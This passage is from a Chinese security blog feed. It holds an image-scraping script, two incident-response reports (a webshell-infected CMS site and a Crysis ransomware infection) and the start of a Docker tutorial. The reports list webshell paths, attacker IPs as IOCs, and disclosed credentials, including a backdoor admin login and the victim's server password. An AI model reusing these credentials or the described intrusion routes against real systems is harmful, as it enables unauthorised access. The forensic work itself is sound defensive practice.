Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">要爬的图片</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">url = [<span class="string">"https://i.imgur.com/kE3atnM.jpg"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/K0ir4GS.jpg"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/IGl4o0B.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/xCyyXjU.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/c245pIe.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/8P1fu00.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/iTJfqEf.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/0Y7xwUl.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/W094eVA.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/yOXYcFY.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/nSGClOf.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/SjrKLsD.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/J2a5zf3.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/kSISTKX.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/S736bs1.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/PjRWXTZ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/yruh3Pq.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/s38MFFX.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/sPE20Hb.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Ye7UZud.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/xMzzCZJ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/esB7tyE.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/cvxCVx1.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/bD6y8ZP.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/4EXOh4m.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/fO5cyZG.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/DIdK6Z2.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/VlpAP9x.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/vFfnPmR.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/33OQjRC.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/tC5ULwB.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/RRpquVF.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/tqlK5nk.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/ekaoutn.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/EdUQG81.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/5wHxY18.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/o4JmAOC.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/y6oQvSz.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/NII0BB1.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/So4QQQi.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/KAqDDXX.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/IeVvnxj.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/ofCS3YD.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/jOkSclQ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/xI2gMw7.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/LbTCSRm.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/XLntPfM.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/JtgcTUf.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/m0ZsPMQ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/oBvtki7.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/mHkYCIg.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/z3MZ1bQ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/z9yE9WC.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/I6kUFLf.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/XZ5CSOb.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/IwcYFcO.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/3Uu0tpL.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/rSPg1hK.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Mn1ZkmD.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/GLCnFCF.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/5JxxULl.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/H67jYWx.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/VMs1r1r.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/MtBdViP.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Vt2YN9X.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Fqrmmzf.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/llan4IP.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/VUPv5h2.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/k2T81yl.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/ZNfTCeU.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/THTBupL.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/0Yb4UVs.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/fN8UQ4p.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/ft1JSYE.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Jl5iYlS.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/fCmtfmQ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/bgbVlHY.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/V8UFiNW.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/KEPMTDJ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/cDK4uAr.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/tgu1VRB.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Bgo9UZt.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/2fTNylb.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/3jGpBn8.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/aMnIsaI.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/qDqUgTU.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/t0d7dFH.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/el9mg3o.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/eKrIdl7.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/jztCtrX.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/27OOfqx.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Xk04H89.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/TgaG9LZ.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/Wr1vQVq.png"</span>,</span><br><span class="line">       <span class="string">"https://i.imgur.com/MDlt5N1.png"</span>]</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'socks5://127.0.0.1:1080'</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: choice(USER_AGENTS)&#125;</span><br><span class="line">folder_path = <span class="string">'path/to/hexo/blog/source/images/'</span>  <span class="comment"># 保存的图片目录</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImgurPic</span><span class="params">(url)</span>:</span></span><br><span class="line">    response = requests.get(url, proxies=proxies, headers=headers)</span><br><span class="line">    print(<span class="string">'[+]'</span>+url+<span class="string">'----'</span>+str(response.status_code))</span><br><span class="line">    saveImg(renameImg(url),response)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renameImg</span><span class="params">(imgUrl)</span>:</span></span><br><span class="line">    imgExt = imgUrl.split(<span class="string">'.'</span>)[<span class="number">-1</span>]</span><br><span class="line">    imgName = imgUrl.split(<span class="string">'.'</span>)[<span class="number">-2</span>]</span><br><span class="line">    imgName = imgName.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    img_name = folder_path + imgName + <span class="string">'.'</span> + imgExt</span><br><span class="line">    <span class="keyword">return</span> img_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveImg</span><span class="params">(imgName,response)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(imgName, <span class="string">'wb'</span>) <span class="keyword">as</span> file:  <span class="comment"># 以byte形式将图片数据写入</span></span><br><span class="line">        file.write(response.content)</span><br><span class="line">        file.flush()</span><br><span class="line">        print(<span class="string">'[+] '</span> + <span class="string">'图片：'</span>+imgName+ <span class="string">' 保存完成'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> imgUrl <span class="keyword">in</span> url:</span><br><span class="line">        getImgurPic(imgUrl)</span><br></pre></td></tr></table></figure><p>最终结果</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555038827528.png" alt="1555038827528"></p><p>搞定，替换掉md文件中的链接即可</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/p/be58.html"/>
      <url>/p/be58.html</url>
      
        <content type="html"><![CDATA[<p>接到个单子，网站被挂博彩</p><a id="more"></a><h1 id="客户机器环境"><a href="#客户机器环境" class="headerlink" title="客户机器环境"></a>客户机器环境</h1><ul><li>服务器系统：CentOS 7</li><li>服务器管理面板：宝塔</li><li>CMS：织梦CMS V57 SP2</li></ul><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>向客户了解情况后，登录了服务器进行检查，发现历史执行过的命令有些异常，系统帐号被添加了<code>admin</code>，用户组为<code>admin</code>，向客户确认后为客户所执行，帐号非客户所添加</p><p><img src= "/img/loading.gif" data-lazy-src="/images/20190412235526.jpg" alt="20190412235526"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555084740738.png" alt="1555084740738"></p><h1 id="网络检查"><a href="#网络检查" class="headerlink" title="网络检查"></a>网络检查</h1><p>随后执行了<code>netstat -anutlp</code>对当前连接进行了检查，无异常，初步判定没有被留远控</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555084845254.png" alt="1555084845254"></p><h1 id="SSH检查"><a href="#SSH检查" class="headerlink" title="SSH检查"></a>SSH检查</h1><p>对<code>SSH配置文件</code>、<code>SSH应用程序</code>进行了检查，</p><p><code>SSH</code>程序正常</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085209260.png" alt="1555085209260"></p><p><code>SSH配置文件</code>发现被设置了<code>ssh key</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555084968047.png" alt="1555084968047"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555084989451.png" alt="1555084989451"></p><h1 id="文件检测-amp-日志分析"><a href="#文件检测-amp-日志分析" class="headerlink" title="文件检测&amp;日志分析"></a>文件检测&amp;日志分析</h1><h2 id="文件检测"><a href="#文件检测" class="headerlink" title="文件检测"></a>文件检测</h2><p>由于客户机器上运行着4个站点，所以<code>down</code>了相关网站文件和日志，网站文件使用D盾进行了扫描，发现其中2个<code>织梦CMS</code>站点都被传了<code>Shell</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085421641.png" alt="1555085421641"></p><p>shell路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;m.xxx.com&#x2F;anli&#x2F;list_2.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;data&#x2F;enums&#x2F;bodytypes.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;data&#x2F;module&#x2F;moduleurllist.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;images&#x2F;js&#x2F;ui.core.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;include&#x2F;ckeditor&#x2F;plugins&#x2F;iframe&#x2F;images&#x2F;indax.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;install&#x2F;config.cache.inc.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;member&#x2F;ajax_loginsta.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;plus&#x2F;arcmulti.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;plus&#x2F;img&#x2F;face&#x2F;list_2_2.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;templets&#x2F;default&#x2F;style&#x2F;touchslide.1.1.php</span><br><span class="line">&#x2F;m.xxx.com&#x2F;tuiguang&#x2F;18.html.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;anli&#x2F;list_1.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;images&#x2F;lurd&#x2F;button_save.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;include&#x2F;dialog&#x2F;img&#x2F;picviewnone.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;include&#x2F;inc&#x2F;funstring.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;jianzhan&#x2F;list_3.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;jinfuzi-seo&#x2F;css&#x2F;menuold.php  </span><br><span class="line">&#x2F;www.xxx.com&#x2F;plus&#x2F;img&#x2F;channellist.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;templets&#x2F;default&#x2F;images&#x2F;banner_03.php</span><br><span class="line">&#x2F;www.xxx.com&#x2F;tuiguang&#x2F;2018&#x2F;1205&#x2F;19.php</span><br></pre></td></tr></table></figure><p>其中一个shell</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085541989.png" alt="1555085541989"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>使用<code>Apache Log Viewer</code>对日志进行分析，设置了<code>shell</code>文件正则后如下图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085600301.png" alt="1555085600301"></p><p>寻找第一次访问shell的IP</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085633502.png" alt="1555085633502"></p><p>最终发现</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085667111.png" alt="1555085667111"></p><p><code>IP:117.95.26.92</code>为首次使用<code>网站后门</code>上传其他<code>shell</code>的IP</p><p>由于客户的站点是仿站，模板为网上下载，怀疑存在模板后门的情况，综合日志分析，确认为模板后门</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555085822400.png" alt="1555085822400"></p><h1 id="处置与意见"><a href="#处置与意见" class="headerlink" title="处置与意见"></a>处置与意见</h1><ol><li>网站中的木马文件已经删除，根据访问日志确认是模板后门造成的此次事件。</li><li>服务器异常账户已经删除，考虑到该异常账户多次成功登录到服务器，而且历史操作中有切换到root用户痕迹，怀疑服务器密码已经泄漏，已建议客户修改。</li><li>数据库检查中发现<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 存在一个疑似后门的账户，用户名admin. 密码admin1.2.3.</li><li>被篡改的首页已经恢复。</li></ol><h1 id="附：IOC"><a href="#附：IOC" class="headerlink" title="附：IOC"></a>附：IOC</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23.27.103.198</span><br><span class="line">23.27.103.219</span><br><span class="line">23.27.117.179</span><br><span class="line">23.27.117.187</span><br><span class="line">23.27.117.190</span><br><span class="line">23.27.126.154</span><br><span class="line">50.117.40.78</span><br><span class="line">50.117.40.81</span><br><span class="line">50.117.40.85</span><br><span class="line">69.46.80.176</span><br><span class="line">69.46.80.186</span><br><span class="line">113.121.166.74</span><br><span class="line">117.90.0.28</span><br><span class="line">117.91.209.137</span><br><span class="line">117.95.26.92</span><br><span class="line">121.40.20.81</span><br><span class="line">173.245.77.205</span><br><span class="line">205.164.1.197</span><br><span class="line">205.164.1.199</span><br><span class="line">205.164.1.207</span><br><span class="line">205.164.1.208</span><br><span class="line">205.164.1.210</span><br><span class="line">205.164.26.66</span><br><span class="line">205.164.26.81</span><br><span class="line">205.164.26.94</span><br><span class="line">216.172.155.132</span><br><span class="line">216.172.155.148</span><br><span class="line">216.172.155.155</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒应急响应</title>
      <link href="/p/f5fc.html"/>
      <url>/p/f5fc.html</url>
      
        <content type="html"><![CDATA[<p>几天前接到一家网络教育公司的应急请求，总结下。</p><a id="more"></a><h1 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h1><p>服务器经过检查后确认感染的勒索病毒为Crysis家族V4变种，由于CrySiS家族采用AES+RSA的加密方式，目前尚无私钥流出，因此目前无法解密。</p><h1 id="涉及到的客户资产"><a href="#涉及到的客户资产" class="headerlink" title="涉及到的客户资产"></a>涉及到的客户资产</h1><ul><li><p>主机名：WIN-HOXXXXXIG</p></li><li><p>服务器IP：182.XXX.XXX.119</p></li><li><p>操作系统：Windows Server 2008 R2 Enterprise</p></li></ul><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p><strong>由于之前发生过多起勒索+挖矿攻击事件，因此首先对客户机器的状况进行检测</strong></p><h2 id="系统状况检查"><a href="#系统状况检查" class="headerlink" title="系统状况检查"></a>系统状况检查</h2><p>CPU、内存、网络占用率均为正常水平，无挖矿行为痕迹</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image001-1554996878750.png" alt="image001"></p><h2 id="系统进程检查"><a href="#系统进程检查" class="headerlink" title="系统进程检查"></a>系统进程检查</h2><p>经过wmic 命令获取进程信息及procexp 检查，除自启动勒索信息外，初步判定操作系统无异常进程</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image002.png" alt="image002"></p><h2 id="系统服务检查"><a href="#系统服务检查" class="headerlink" title="系统服务检查"></a>系统服务检查</h2><p>通过对系统服务进行检查，未发现恶意服务</p><h2 id="系统启动项检查"><a href="#系统启动项检查" class="headerlink" title="系统启动项检查"></a>系统启动项检查</h2><p>对操作系统相关位置进行检查后，除自启动勒索信息外，未发现恶意启动项</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image003.png" alt="image003"></p><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>除勒索信息外，注册表无异常启动项</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image004.png" alt="image004"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image005.png" alt="image005"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image006.png" alt="image006"></p><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>除勒索信息外，无异常启动项</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image007.png" alt="image007"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image008.png" alt="image008"></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>除广告程序外，无异常计划任务</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image009.png" alt="image009"></p><h3 id="系统文件"><a href="#系统文件" class="headerlink" title="系统文件"></a>系统文件</h3><p>除勒索信息外，系统文件无异常，无Crysis家族释放的文件</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image010.png" alt="image010"></p><h3 id="系统账户检查"><a href="#系统账户检查" class="headerlink" title="系统账户检查"></a>系统账户检查</h3><p>在注册表中发现异常账户</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image011.png" alt="image011"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image012.png" alt="image012"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image013.png" alt="image013"></p><h3 id="网络连接与防火墙配置检查"><a href="#网络连接与防火墙配置检查" class="headerlink" title="网络连接与防火墙配置检查"></a>网络连接与防火墙配置检查</h3><p>未发现异常现象</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image014.png" alt="image014"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1554996412584.png" alt="1554996412584"></p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>通过对操作系统日志进行分析，发现在<code>2019年4月6日</code>下午2点前有大量远程桌面登录失败的日志，判定为暴力破解账号密码植入的勒索病毒，同时发现在<code>2019年4月7日</code>有IP为<code>121.207.227.69</code>（中国福建泉州）的机器对服务器进行了暴力破解账号密码，IP为<code>141.98.252.166</code>（英国伦敦）与<code>59.63.182.243</code>（中国江西南昌）分别于<code>2019年4月5日21时26分</code>和<code>2019年4月5日5时33分</code>成功登录了服务器。</p><p> <img src= "/img/loading.gif" data-lazy-src="/images/image016.png" alt="image016"></p><p>成功登录服务器</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1554997063124.png" alt="1554997063124"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1554997084598.png" alt="1554997084598"></p><p>同时提取到IP<code>141.98.252.166</code>在<code>2019/4/5 21:26:18</code>到<code>2019/4/5 22:55:16</code>期间多次登录并注销远程连接</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image020.png" alt="image020"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image019.png" alt="image019">   </p><h1 id="三、发现的问题及处置意见"><a href="#三、发现的问题及处置意见" class="headerlink" title="三、发现的问题及处置意见"></a>三、发现的问题及处置意见</h1><p>在应急响应过程中发现多处服务器配置问题，具体如下：</p><ol><li><p>服务器开启了IPC$文件共享服务</p></li><li><p>服务器管理员账户密码为弱口令</p></li><li><p>服务器操作系统存在<em>EternalBlue</em> (MS17-010)高危漏洞</p></li></ol><h2 id="处置意见"><a href="#处置意见" class="headerlink" title="处置意见"></a>处置意见</h2><ol><li><p>IPC$文件共享服务为高危服务，历史上发生过多起通过该服务入侵的案例，如非必须，建议关闭该服务，如需要该服务，建议进行严格的权限管控。</p></li><li><p>服务器密码为zxcv!@34，属于键盘顺序弱口令，建议更换。</p></li><li><p><strong>EternalBlue</strong>(在微软漏洞编号MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码，微软官方补丁编号<strong>KB 4013389</strong>，建议立即安装。</p></li><li><p>鉴于服务器操作已被勒索病毒破坏，系统完整性已缺失，建议进行备份重要文件后重新安装操作系统并执行处置意见中的1~3步。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker中的RUN CMD和ENTRYPOINT</title>
      <link href="/p/7f07.html"/>
      <url>/p/7f07.html</url>
      
        <content type="html"><![CDATA[<p>总结下Docker中的RUN CMD和ENTRYPOINT区别</p><a id="more"></a><table><thead><tr><th align="center">命令</th><th align="center">用途</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">RUN</td><td align="center">执行命令并创建新的镜像层</td><td align="center">在当前镜像的顶部执行命令，并通过创建新的镜像层，经常用于安装软件包，Dockerfile 中常常包含<strong>多个</strong> <code>RUN</code>指令</td></tr><tr><td align="center">CMD</td><td align="center">设置容器启动后默认执行的命令及其参数</td><td align="center">此命令会在容器启动且 <code>docker run</code><strong>没有指定其他命令时运行</strong>(CMD 能够被 <code>docker run</code> 后面跟的命令行参数替换)</td></tr><tr><td align="center">ENTRYPOINT</td><td align="center">配置容器启动时运行的命令</td><td align="center">让容器以应用程序或者服务的形式运行</td></tr></tbody></table><h1 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h1><p>RUN 指令通常用于安装应用和软件包。</p><p>RUN 在当前镜像的顶部执行命令，并通过创建新的镜像层。Dockerfile 中常常包含多个 RUN 指令。</p><p>RUN 有两种格式：</p><ol><li>Shell 格式：<code>RUN</code></li><li>Exec 格式：<code>RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</code></li></ol><p>下面是使用 RUN 安装多个包的例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; apt-get install -y \  </span></span><br><span class="line"> bzr \</span><br><span class="line"> cvs \</span><br><span class="line"> git \</span><br><span class="line"> mercurial \</span><br><span class="line"> subversion</span><br></pre></td></tr></table></figure><p>注意：<strong>apt-get update 和 apt-get install 被放在一个 RUN 指令中执行</strong>，这样能够保证每次安装的是最新的包。如果 apt-get install 在单独的 RUN 中执行，则会使用 apt-get update 创建的镜像层，而这一层可能是很久以前缓存的。</p><h1 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h1><p>CMD 指令允许用户指定容器的默认执行的命令。</p><p>此命令会在容器启动且 docker run 没有指定其他命令时运行。</p><ol><li>如果 <code>docker run</code>指定了其他命令，CMD 指定的默认命令将被忽略。</li><li>如果 <code>Dockerfile</code>中有多个 CMD 指令，<strong>只有最后一个 CMD 有效。</strong></li></ol><p>CMD 有三种格式：</p><ol><li>Exec 格式：<code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code><br>这是 CMD 的推荐格式。</li><li><code>CMD [&quot;param1&quot;,&quot;param2&quot;]</code> 为 ENTRYPOINT 提供额外的参数，此时 ENTRYPOINT 必须使用 Exec 格式。</li><li>Shell 格式：<code>CMD command param1 param2</code></li></ol><p>Exec 和 Shell 格式前面已经介绍过了。<br>第二种格式 <code>CMD [&quot;param1&quot;,&quot;param2&quot;]</code>要与 Exec 格式 的 ENTRYPOINT 指令配合使用，其用途是为 ENTRYPOINT 设置默认的参数。我们将在后面讨论 ENTRYPOINT 时举例说明。</p><p>下面看看 CMD 是如何工作的。Dockerfile 片段如下：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"Hello 